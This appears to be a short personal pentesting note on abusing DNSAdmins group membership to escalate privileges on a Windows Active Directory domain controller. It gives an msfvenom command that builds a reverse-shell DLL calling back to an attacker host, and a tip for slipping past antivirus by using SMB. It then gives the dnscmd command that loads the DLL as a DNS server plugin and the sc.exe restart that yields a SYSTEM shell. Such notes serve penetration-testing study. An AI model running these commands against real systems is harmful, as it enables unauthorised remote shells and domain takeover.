[https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2)
- this guide is really good
  
first check that the user is part of the DNSAdmins group
![[../../assets/DNSAdmins/image 404.png|image 404.png]]
  
craft a dll payload for the dnscmd.exe
- msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=ATTACKER<PORT>-f dll > privesc.dll
  
if you’re using evil-winrm, the dll will get picked up by AV, so use smb instead
![[../../assets/DNSAdmins/image 1 301.png|image 1 301.png]]
  
set up a listener on the port specified in the dll
![[../../assets/DNSAdmins/image 2 255.png|image 2 255.png]]
  
next inject the dll into the dnscmd.exe
![[../../assets/DNSAdmins/image 3 217.png|image 3 217.png]]
- cmd /c dnscmd localhost /config /serverlevelplugindll \\<IP>\<share>\privesc.dll
  
next stop the DNS server
- cmd /c sc.exe stop dns
![[../../assets/DNSAdmins/image 4 188.png|image 4 188.png]]
then start the DNS server again
- cmd /c sc.exe start dns
![[../../assets/DNSAdmins/image 5 174.png|image 5 174.png]]
  
if it’s successful, you should see some activity on the smb share
![[../../assets/DNSAdmins/image 6 149.png|image 6 149.png]]
  
should pop the shell too (NT\Authority)
![[../../assets/DNSAdmins/image 7 138.png|image 7 138.png]]